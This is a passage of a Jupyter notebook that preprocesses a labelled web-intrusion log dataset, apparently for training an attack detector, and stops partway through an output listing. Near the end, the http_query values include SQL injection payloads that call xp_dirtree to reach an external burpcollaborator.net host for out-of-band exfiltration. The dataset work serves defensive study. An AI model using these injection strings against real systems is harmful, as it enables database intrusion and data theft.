{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: pandas in /usr/local/lib/python3.8/dist-packages (2.0.1)\n",
      "Requirement already satisfied: openpyxl in /usr/local/lib/python3.8/dist-packages (3.1.2)\n",
      "Requirement already satisfied: tqdm in /usr/local/lib/python3.8/dist-packages (4.65.0)\n",
      "Requirement already satisfied: pytz>=2020.1 in /usr/local/lib/python3.8/dist-packages (from pandas) (2023.3)\n",
      "Requirement already satisfied: numpy>=1.20.3; python_version < \"3.10\" in /usr/local/lib/python3.8/dist-packages (from pandas) (1.23.4)\n",
      "Requirement already satisfied: python-dateutil>=2.8.2 in /usr/local/lib/python3.8/dist-packages (from pandas) (2.8.2)\n",
      "Requirement already satisfied: tzdata>=2022.1 in /usr/local/lib/python3.8/dist-packages (from pandas) (2023.3)\n",
      "Requirement already satisfied: et-xmlfile in /usr/local/lib/python3.8/dist-packages (from openpyxl) (1.1.0)\n",
      "Requirement already satisfied: six>=1.5 in /usr/lib/python3/dist-packages (from python-dateutil>=2.8.2->pandas) (1.14.0)\n",
      "\u001b[33mWARNING: You are using pip version 20.2.4; however, version 23.1.2 is available.\n",
      "You should consider upgrading via the '/usr/bin/python3 -m pip install --upgrade pip' command.\u001b[0m\n",
      "Requirement already up-to-date: pandas-profiling in /usr/local/lib/python3.8/dist-packages (3.6.6)\n",
      "Requirement already satisfied, skipping upgrade: ydata-profiling in /usr/local/lib/python3.8/dist-packages (from pandas-profiling) (4.1.2)\n",
      "Requirement already satisfied, skipping upgrade: seaborn<0.13,>=0.10.1 in /usr/local/lib/python3.8/dist-packages (from ydata-profiling->pandas-profiling) (0.12.2)\n",
      "Requirement already satisfied, skipping upgrade: phik<0.13,>=0.11.1 in /usr/local/lib/python3.8/dist-packages (from ydata-profiling->pandas-profiling) (0.12.3)\n",
      "Requirement already satisfied, skipping upgrade: multimethod<1.10,>=1.4 in /usr/local/lib/python3.8/dist-packages (from ydata-profiling->pandas-profiling) (1.9.1)\n",
      "Requirement already satisfied, skipping upgrade: scipy<1.10,>=1.4.1 in /usr/local/lib/python3.8/dist-packages (from ydata-profiling->pandas-profiling) (1.9.3)\n",
      "Requirement already satisfied, skipping upgrade: PyYAML<6.1,>=5.0.0 in /usr/local/lib/python3.8/dist-packages (from ydata-profiling->pandas-profiling) (6.0)\n",
      "Requirement already satisfied, skipping upgrade: matplotlib<3.7,>=3.2 in /usr/local/lib/python3.8/dist-packages (from ydata-profiling->pandas-profiling) (3.6.2)\n",
      "Collecting tqdm<4.65,>=4.48.2\n",
      "  Downloading tqdm-4.64.1-py2.py3-none-any.whl (78 kB)\n",
      "\u001b[K     |████████████████████████████████| 78 kB 5.5 MB/s eta 0:00:011\n",
      "\u001b[?25hRequirement already satisfied, skipping upgrade: numpy<1.24,>=1.16.0 in /usr/local/lib/python3.8/dist-packages (from ydata-profiling->pandas-profiling) (1.23.4)\n",
      "Requirement already satisfied, skipping upgrade: visions[type_image_path]==0.7.5 in /usr/local/lib/python3.8/dist-packages (from ydata-profiling->pandas-profiling) (0.7.5)\n",
      "Requirement already satisfied, skipping upgrade: statsmodels<0.14,>=0.13.2 in /usr/local/lib/python3.8/dist-packages (from ydata-profiling->pandas-profiling) (0.13.5)\n",
      "Requirement already satisfied, skipping upgrade: imagehash==4.3.1 in /usr/local/lib/python3.8/dist-packages (from ydata-profiling->pandas-profiling) (4.3.1)\n",
      "Requirement already satisfied, skipping upgrade: jinja2<3.2,>=2.11.1 in /usr/local/lib/python3.8/dist-packages (from ydata-profiling->pandas-profiling) (3.1.2)\n",
      "Requirement already satisfied, skipping upgrade: typeguard<2.14,>=2.13.2 in /usr/local/lib/python3.8/dist-packages (from ydata-profiling->pandas-profiling) (2.13.3)\n",
      "Requirement already satisfied, skipping upgrade: htmlmin==0.1.12 in /usr/local/lib/python3.8/dist-packages (from ydata-profiling->pandas-profiling) (0.1.12)\n",
      "Collecting pandas!=1.4.0,<1.6,>1.1\n",
      "  Downloading pandas-1.5.3-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (12.2 MB)\n",
      "\u001b[K     |████████████████████████████████| 12.2 MB 34.4 MB/s eta 0:00:01\n",
      "\u001b[?25hRequirement already satisfied, skipping upgrade: pydantic<1.11,>=1.8.1 in /usr/local/lib/python3.8/dist-packages (from ydata-profiling->pandas-profiling) (1.10.7)\n",
      "Requirement already satisfied, skipping upgrade: requests<2.29,>=2.24.0 in /usr/local/lib/python3.8/dist-packages (from ydata-profiling->pandas-profiling) (2.28.2)\n",
      "Requirement already satisfied, skipping upgrade: joblib>=0.14.1 in /usr/local/lib/python3.8/dist-packages (from phik<0.13,>=0.11.1->ydata-profiling->pandas-profiling) (1.2.0)\n",
      "Requirement already satisfied, skipping upgrade: pyparsing>=2.2.1 in /usr/local/lib/python3.8/dist-packages (from matplotlib<3.7,>=3.2->ydata-profiling->pandas-profiling) (3.0.9)\n",
      "Requirement already satisfied, skipping upgrade: fonttools>=4.22.0 in /usr/local/lib/python3.8/dist-packages (from matplotlib<3.7,>=3.2->ydata-profiling->pandas-profiling) (4.38.0)\n",
      "Requirement already satisfied, skipping upgrade: packaging>=20.0 in /usr/local/lib/python3.8/dist-packages (from matplotlib<3.7,>=3.2->ydata-profiling->pandas-profiling) (21.3)\n",
      "Requirement already satisfied, skipping upgrade: python-dateutil>=2.7 in /usr/local/lib/python3.8/dist-packages (from matplotlib<3.7,>=3.2->ydata-profiling->pandas-profiling) (2.8.2)\n",
      "Requirement already satisfied, skipping upgrade: pillow>=6.2.0 in /usr/local/lib/python3.8/dist-packages (from matplotlib<3.7,>=3.2->ydata-profiling->pandas-profiling) (9.3.0)\n",
      "Requirement already satisfied, skipping upgrade: cycler>=0.10 in /usr/local/lib/python3.8/dist-packages (from matplotlib<3.7,>=3.2->ydata-profiling->pandas-profiling) (0.11.0)\n",
      "Requirement already satisfied, skipping upgrade: contourpy>=1.0.1 in /usr/local/lib/python3.8/dist-packages (from matplotlib<3.7,>=3.2->ydata-profiling->pandas-profiling) (1.0.6)\n",
      "Requirement already satisfied, skipping upgrade: kiwisolver>=1.0.1 in /usr/local/lib/python3.8/dist-packages (from matplotlib<3.7,>=3.2->ydata-profiling->pandas-profiling) (1.4.4)\n",
      "Requirement already satisfied, skipping upgrade: attrs>=19.3.0 in /usr/local/lib/python3.8/dist-packages (from visions[type_image_path]==0.7.5->ydata-profiling->pandas-profiling) (22.1.0)\n",
      "Requirement already satisfied, skipping upgrade: tangled-up-in-unicode>=0.0.4 in /usr/local/lib/python3.8/dist-packages (from visions[type_image_path]==0.7.5->ydata-profiling->pandas-profiling) (0.2.0)\n",
      "Requirement already satisfied, skipping upgrade: networkx>=2.4 in /usr/local/lib/python3.8/dist-packages (from visions[type_image_path]==0.7.5->ydata-profiling->pandas-profiling) (3.1)\n",
      "Requirement already satisfied, skipping upgrade: patsy>=0.5.2 in /usr/local/lib/python3.8/dist-packages (from statsmodels<0.14,>=0.13.2->ydata-profiling->pandas-profiling) (0.5.3)\n",
      "Requirement already satisfied, skipping upgrade: PyWavelets in /usr/local/lib/python3.8/dist-packages (from imagehash==4.3.1->ydata-profiling->pandas-profiling) (1.4.1)\n",
      "Requirement already satisfied, skipping upgrade: MarkupSafe>=2.0 in /usr/local/lib/python3.8/dist-packages (from jinja2<3.2,>=2.11.1->ydata-profiling->pandas-profiling) (2.1.1)\n",
      "Requirement already satisfied, skipping upgrade: pytz>=2020.1 in /usr/local/lib/python3.8/dist-packages (from pandas!=1.4.0,<1.6,>1.1->ydata-profiling->pandas-profiling) (2023.3)\n",
      "Requirement already satisfied, skipping upgrade: typing-extensions>=4.2.0 in /usr/local/lib/python3.8/dist-packages (from pydantic<1.11,>=1.8.1->ydata-profiling->pandas-profiling) (4.4.0)\n",
      "Requirement already satisfied, skipping upgrade: charset-normalizer<4,>=2 in /usr/local/lib/python3.8/dist-packages (from requests<2.29,>=2.24.0->ydata-profiling->pandas-profiling) (3.1.0)\n",
      "Requirement already satisfied, skipping upgrade: idna<4,>=2.5 in /usr/lib/python3/dist-packages (from requests<2.29,>=2.24.0->ydata-profiling->pandas-profiling) (2.8)\n",
      "Requirement already satisfied, skipping upgrade: urllib3<1.27,>=1.21.1 in /usr/lib/python3/dist-packages (from requests<2.29,>=2.24.0->ydata-profiling->pandas-profiling) (1.25.8)\n",
      "Requirement already satisfied, skipping upgrade: certifi>=2017.4.17 in /usr/lib/python3/dist-packages (from requests<2.29,>=2.24.0->ydata-profiling->pandas-profiling) (2019.11.28)\n",
      "Requirement already satisfied, skipping upgrade: six>=1.5 in /usr/lib/python3/dist-packages (from python-dateutil>=2.7->matplotlib<3.7,>=3.2->ydata-profiling->pandas-profiling) (1.14.0)\n",
      "Installing collected packages: tqdm, pandas\n",
      "  Attempting uninstall: tqdm\n",
      "    Found existing installation: tqdm 4.65.0\n",
      "    Uninstalling tqdm-4.65.0:\n",
      "      Successfully uninstalled tqdm-4.65.0\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Attempting uninstall: pandas\n",
      "    Found existing installation: pandas 2.0.1\n",
      "    Uninstalling pandas-2.0.1:\n",
      "      Successfully uninstalled pandas-2.0.1\n",
      "Successfully installed pandas-1.5.3 tqdm-4.64.1\n",
      "\u001b[33mWARNING: You are using pip version 20.2.4; however, version 23.1.2 is available.\n",
      "You should consider upgrading via the '/usr/bin/python3 -m pip install --upgrade pip' command.\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "!pip3 install pandas openpyxl tqdm pandas-profiling"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Import and PATH setting"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "<ipython-input-1-88ed54c92eb7>:2: DeprecationWarning: `import pandas_profiling` is going to be deprecated by April 1st. Please use `import ydata_profiling` instead.\n",
      "  import pandas_profiling\n"
     ]
    }
   ],
   "source": [
    "import pandas as pd\n",
    "import pandas_profiling\n",
    "from glob import glob\n",
    "from tqdm import tqdm"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "DATAPATH = \"./dataset\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Preprocessing"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Excel Load"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['./dataset/WEB.Teamviewer.이용.업데이트.서버.해킹사고/3-09-WEB_IIS-LBL.xlsx',\n",
       " './dataset/WEB.홈페이지를.통한.내부망.장악/3-01-WEB_IIS-LBL.xlsx',\n",
       " './dataset/WEB.Apache.WAS(Tomcat).취약점.악용.권한.탈취.사고/3-14-WEB_Apache-LBL.xlsx',\n",
       " './dataset/WEB.IIS.SQL.Injection.취약점.악용.데이터.유출.사고/3-13-WEB_IIS-LBL.xlsx',\n",
       " './dataset/WEB.유닉스.취약점.악용.및.랜섬웨어.감염/3-02-WEB_Apache-LBL.xlsx']"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "excels_path = glob(f\"{DATAPATH}/*/*LBL*\")\n",
    "excels_path"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|██████████| 5/5 [00:07<00:00,  1.41s/it]\n"
     ]
    }
   ],
   "source": [
    "web_df = pd.DataFrame()\n",
    "\n",
    "for excel_path in tqdm(excels_path):\n",
    "    df = pd.read_excel(excel_path, engine='openpyxl')\n",
    "    web_df = pd.concat([web_df, df])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>rn</th>\n",
       "      <th>event_time</th>\n",
       "      <th>s_ip</th>\n",
       "      <th>s_port</th>\n",
       "      <th>s_country</th>\n",
       "      <th>d_ip</th>\n",
       "      <th>d_port</th>\n",
       "      <th>d_country</th>\n",
       "      <th>direction</th>\n",
       "      <th>http_method</th>\n",
       "      <th>...</th>\n",
       "      <th>pkt_bytes</th>\n",
       "      <th>rcvd_bytes</th>\n",
       "      <th>referer</th>\n",
       "      <th>sent_bytes</th>\n",
       "      <th>user_agent</th>\n",
       "      <th>label_attack</th>\n",
       "      <th>label_mitre</th>\n",
       "      <th>label_scenario</th>\n",
       "      <th>Unnamed: 20</th>\n",
       "      <th>Unnamed: 21</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>1</td>\n",
       "      <td>10/28/21 2:27</td>\n",
       "      <td>10.0.0.1</td>\n",
       "      <td>0</td>\n",
       "      <td>KR</td>\n",
       "      <td>172.16.1.60</td>\n",
       "      <td>80</td>\n",
       "      <td>-</td>\n",
       "      <td>3</td>\n",
       "      <td>GET</td>\n",
       "      <td>...</td>\n",
       "      <td>5547</td>\n",
       "      <td>480.0</td>\n",
       "      <td>-</td>\n",
       "      <td>5547.0</td>\n",
       "      <td>Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...</td>\n",
       "      <td>attack</td>\n",
       "      <td>T1204.002</td>\n",
       "      <td>-</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>2</td>\n",
       "      <td>10/28/21 2:27</td>\n",
       "      <td>10.0.0.1</td>\n",
       "      <td>0</td>\n",
       "      <td>KR</td>\n",
       "      <td>172.16.1.60</td>\n",
       "      <td>80</td>\n",
       "      <td>-</td>\n",
       "      <td>3</td>\n",
       "      <td>GET</td>\n",
       "      <td>...</td>\n",
       "      <td>5547</td>\n",
       "      <td>480.0</td>\n",
       "      <td>-</td>\n",
       "      <td>5547.0</td>\n",
       "      <td>Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...</td>\n",
       "      <td>attack</td>\n",
       "      <td>T1204.002</td>\n",
       "      <td>-</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>3</td>\n",
       "      <td>10/28/21 2:27</td>\n",
       "      <td>10.0.0.1</td>\n",
       "      <td>0</td>\n",
       "      <td>KR</td>\n",
       "      <td>172.16.1.60</td>\n",
       "      <td>80</td>\n",
       "      <td>-</td>\n",
       "      <td>3</td>\n",
       "      <td>GET</td>\n",
       "      <td>...</td>\n",
       "      <td>5549</td>\n",
       "      <td>423.0</td>\n",
       "      <td>http://218.49.112.115/Client.txt</td>\n",
       "      <td>5549.0</td>\n",
       "      <td>Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...</td>\n",
       "      <td>attack</td>\n",
       "      <td>T1204.002</td>\n",
       "      <td>-</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>4</td>\n",
       "      <td>10/28/21 2:28</td>\n",
       "      <td>10.0.0.1</td>\n",
       "      <td>0</td>\n",
       "      <td>KR</td>\n",
       "      <td>172.16.1.60</td>\n",
       "      <td>80</td>\n",
       "      <td>-</td>\n",
       "      <td>3</td>\n",
       "      <td>GET</td>\n",
       "      <td>...</td>\n",
       "      <td>5547</td>\n",
       "      <td>506.0</td>\n",
       "      <td>-</td>\n",
       "      <td>5547.0</td>\n",
       "      <td>Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...</td>\n",
       "      <td>attack</td>\n",
       "      <td>T1204.002</td>\n",
       "      <td>-</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>5</td>\n",
       "      <td>10/29/21 5:30</td>\n",
       "      <td>172.16.1.72</td>\n",
       "      <td>0</td>\n",
       "      <td>-</td>\n",
       "      <td>172.16.1.60</td>\n",
       "      <td>80</td>\n",
       "      <td>-</td>\n",
       "      <td>1</td>\n",
       "      <td>GET</td>\n",
       "      <td>...</td>\n",
       "      <td>5546</td>\n",
       "      <td>267.0</td>\n",
       "      <td>-</td>\n",
       "      <td>5546.0</td>\n",
       "      <td>Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...</td>\n",
       "      <td>normal</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows × 24 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "   rn     event_time         s_ip  s_port s_country         d_ip  d_port  \\\n",
       "0   1  10/28/21 2:27     10.0.0.1       0        KR  172.16.1.60      80   \n",
       "1   2  10/28/21 2:27     10.0.0.1       0        KR  172.16.1.60      80   \n",
       "2   3  10/28/21 2:27     10.0.0.1       0        KR  172.16.1.60      80   \n",
       "3   4  10/28/21 2:28     10.0.0.1       0        KR  172.16.1.60      80   \n",
       "4   5  10/29/21 5:30  172.16.1.72       0         -  172.16.1.60      80   \n",
       "\n",
       "  d_country  direction http_method  ... pkt_bytes rcvd_bytes  \\\n",
       "0         -          3         GET  ...      5547      480.0   \n",
       "1         -          3         GET  ...      5547      480.0   \n",
       "2         -          3         GET  ...      5549      423.0   \n",
       "3         -          3         GET  ...      5547      506.0   \n",
       "4         -          1         GET  ...      5546      267.0   \n",
       "\n",
       "                            referer  sent_bytes  \\\n",
       "0                                 -      5547.0   \n",
       "1                                 -      5547.0   \n",
       "2  http://218.49.112.115/Client.txt      5549.0   \n",
       "3                                 -      5547.0   \n",
       "4                                 -      5546.0   \n",
       "\n",
       "                                          user_agent  label_attack  \\\n",
       "0  Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...        attack   \n",
       "1  Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...        attack   \n",
       "2  Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...        attack   \n",
       "3  Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...        attack   \n",
       "4  Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+Appl...        normal   \n",
       "\n",
       "  label_mitre  label_scenario Unnamed: 20 Unnamed: 21  \n",
       "0   T1204.002               -         NaN         NaN  \n",
       "1   T1204.002               -         NaN         NaN  \n",
       "2   T1204.002               -         NaN         NaN  \n",
       "3   T1204.002               -         NaN         NaN  \n",
       "4           -               -         NaN         NaN  \n",
       "\n",
       "[5 rows x 24 columns]"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "Int64Index: 40182 entries, 0 to 543\n",
      "Data columns (total 24 columns):\n",
      " #   Column          Non-Null Count  Dtype  \n",
      "---  ------          --------------  -----  \n",
      " 0   rn              40182 non-null  int64  \n",
      " 1   event_time      40182 non-null  object \n",
      " 2   s_ip            40182 non-null  object \n",
      " 3   s_port          40182 non-null  int64  \n",
      " 4   s_country       40182 non-null  object \n",
      " 5   d_ip            40182 non-null  object \n",
      " 6   d_port          40182 non-null  int64  \n",
      " 7   d_country       40182 non-null  object \n",
      " 8   direction       40182 non-null  int64  \n",
      " 9   http_method     40182 non-null  object \n",
      " 10  http_query      23626 non-null  object \n",
      " 11  http_version    40182 non-null  object \n",
      " 12  http_url        40182 non-null  object \n",
      " 13  http_status     40182 non-null  int64  \n",
      " 14  pkt_bytes       40182 non-null  int64  \n",
      " 15  rcvd_bytes      2318 non-null   float64\n",
      " 16  referer         40182 non-null  object \n",
      " 17  sent_bytes      13444 non-null  float64\n",
      " 18  user_agent      40182 non-null  object \n",
      " 19  label_attack    40182 non-null  object \n",
      " 20  label_mitre     40182 non-null  object \n",
      " 21  label_scenario  40182 non-null  object \n",
      " 22  Unnamed: 20     0 non-null      float64\n",
      " 23  Unnamed: 21     1 non-null      object \n",
      "dtypes: float64(3), int64(6), object(15)\n",
      "memory usage: 7.7+ MB\n"
     ]
    }
   ],
   "source": [
    "web_df.info()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "web_df = web_df.reset_index()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 필요없는 열 삭제"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "index                 0\n",
       "rn                    0\n",
       "event_time            0\n",
       "s_ip                  0\n",
       "s_port                0\n",
       "s_country             0\n",
       "d_ip                  0\n",
       "d_port                0\n",
       "d_country             0\n",
       "direction             0\n",
       "http_method           0\n",
       "http_query        16556\n",
       "http_version          0\n",
       "http_url              0\n",
       "http_status           0\n",
       "pkt_bytes             0\n",
       "rcvd_bytes        37864\n",
       "referer               0\n",
       "sent_bytes        26738\n",
       "user_agent            0\n",
       "label_attack          0\n",
       "label_mitre           0\n",
       "label_scenario        0\n",
       "Unnamed: 20       40182\n",
       "Unnamed: 21       40181\n",
       "dtype: int64"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_df.isnull().sum()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "web_df.drop(['rn', 'event_time', 's_ip', 's_port', 's_country', 'd_ip', 'd_port',\n",
    "             'd_country', 'user_agent', 'label_mitre', 'label_scenario',\n",
    "             'Unnamed: 20','Unnamed: 21'], axis=1, inplace=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>index</th>\n",
       "      <th>direction</th>\n",
       "      <th>http_method</th>\n",
       "      <th>http_query</th>\n",
       "      <th>http_version</th>\n",
       "      <th>http_url</th>\n",
       "      <th>http_status</th>\n",
       "      <th>pkt_bytes</th>\n",
       "      <th>rcvd_bytes</th>\n",
       "      <th>referer</th>\n",
       "      <th>sent_bytes</th>\n",
       "      <th>label_attack</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0</td>\n",
       "      <td>3</td>\n",
       "      <td>GET</td>\n",
       "      <td>-</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>/Client.txt</td>\n",
       "      <td>404</td>\n",
       "      <td>5547</td>\n",
       "      <td>480.0</td>\n",
       "      <td>-</td>\n",
       "      <td>5547.0</td>\n",
       "      <td>attack</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1</td>\n",
       "      <td>3</td>\n",
       "      <td>GET</td>\n",
       "      <td>-</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>/Client.txt</td>\n",
       "      <td>404</td>\n",
       "      <td>5547</td>\n",
       "      <td>480.0</td>\n",
       "      <td>-</td>\n",
       "      <td>5547.0</td>\n",
       "      <td>attack</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>2</td>\n",
       "      <td>3</td>\n",
       "      <td>GET</td>\n",
       "      <td>-</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>/favicon.ico</td>\n",
       "      <td>404</td>\n",
       "      <td>5549</td>\n",
       "      <td>423.0</td>\n",
       "      <td>http://218.49.112.115/Client.txt</td>\n",
       "      <td>5549.0</td>\n",
       "      <td>attack</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>3</td>\n",
       "      <td>3</td>\n",
       "      <td>GET</td>\n",
       "      <td>-</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>/Client.txt</td>\n",
       "      <td>404</td>\n",
       "      <td>5547</td>\n",
       "      <td>506.0</td>\n",
       "      <td>-</td>\n",
       "      <td>5547.0</td>\n",
       "      <td>attack</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>4</td>\n",
       "      <td>1</td>\n",
       "      <td>GET</td>\n",
       "      <td>-</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>/favicon.ico</td>\n",
       "      <td>404</td>\n",
       "      <td>5546</td>\n",
       "      <td>267.0</td>\n",
       "      <td>-</td>\n",
       "      <td>5546.0</td>\n",
       "      <td>normal</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   index  direction http_method http_query http_version      http_url  \\\n",
       "0      0          3         GET          -     HTTP/1.1   /Client.txt   \n",
       "1      1          3         GET          -     HTTP/1.1   /Client.txt   \n",
       "2      2          3         GET          -     HTTP/1.1  /favicon.ico   \n",
       "3      3          3         GET          -     HTTP/1.1   /Client.txt   \n",
       "4      4          1         GET          -     HTTP/1.1  /favicon.ico   \n",
       "\n",
       "   http_status  pkt_bytes  rcvd_bytes                           referer  \\\n",
       "0          404       5547       480.0                                 -   \n",
       "1          404       5547       480.0                                 -   \n",
       "2          404       5549       423.0  http://218.49.112.115/Client.txt   \n",
       "3          404       5547       506.0                                 -   \n",
       "4          404       5546       267.0                                 -   \n",
       "\n",
       "   sent_bytes label_attack  \n",
       "0      5547.0       attack  \n",
       "1      5547.0       attack  \n",
       "2      5549.0       attack  \n",
       "3      5547.0       attack  \n",
       "4      5546.0       normal  "
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "web_df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "RangeIndex: 40182 entries, 0 to 40181\n",
      "Data columns (total 12 columns):\n",
      " #   Column        Non-Null Count  Dtype  \n",
      "---  ------        --------------  -----  \n",
      " 0   index         40182 non-null  int64  \n",
      " 1   direction     40182 non-null  int64  \n",
      " 2   http_method   40182 non-null  object \n",
      " 3   http_query    23626 non-null  object \n",
      " 4   http_version  40182 non-null  object \n",
      " 5   http_url      40182 non-null  object \n",
      " 6   http_status   40182 non-null  int64  \n",
      " 7   pkt_bytes     40182 non-null  int64  \n",
      " 8   rcvd_bytes    2318 non-null   float64\n",
      " 9   referer       40182 non-null  object \n",
      " 10  sent_bytes    13444 non-null  float64\n",
      " 11  label_attack  40182 non-null  object \n",
      "dtypes: float64(2), int64(4), object(6)\n",
      "memory usage: 3.7+ MB\n"
     ]
    }
   ],
   "source": [
    "web_df.info()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## null 값 대체"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### http_query"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "-                                                                                                                                                                                                                                       12263\n",
       "?org.apache.catalina.filters.CSRF_NONCE=2DB51B70DF17EEE27863DBC19BBBA14A                                                                                                                                                                10044\n",
       "page=1&v_num=111                                                                                                                                                                                                                          400\n",
       "full=true                                                                                                                                                                                                                                  22\n",
       "?part=index&rid=20&bid=notice,talkbox&tid=5&tag=y&hl=0&tsizl=50&pid=                                                                                                                                                                       20\n",
       "                                                                                                                                                                                                                                        ...  \n",
       "page=1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cdj0vyucjeyzq3fwfthtn6xahb8h05rxfo2eq3.burpcollab'%2b'orator.net%5curw'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20&v_num=111|23|800a000d|������_��ġ����_�ʽ��ϴ�.:_'page'         1\n",
       "page=1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5ci5o0kzyo03lvpkikfmfss2wmxd35rwkkb71vq.burpcollab'%2b'orator.net%5cvsa'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20&v_num=111|23|800a000d|������_��ġ����_�ʽ��ϴ�.:_'page'        1\n",
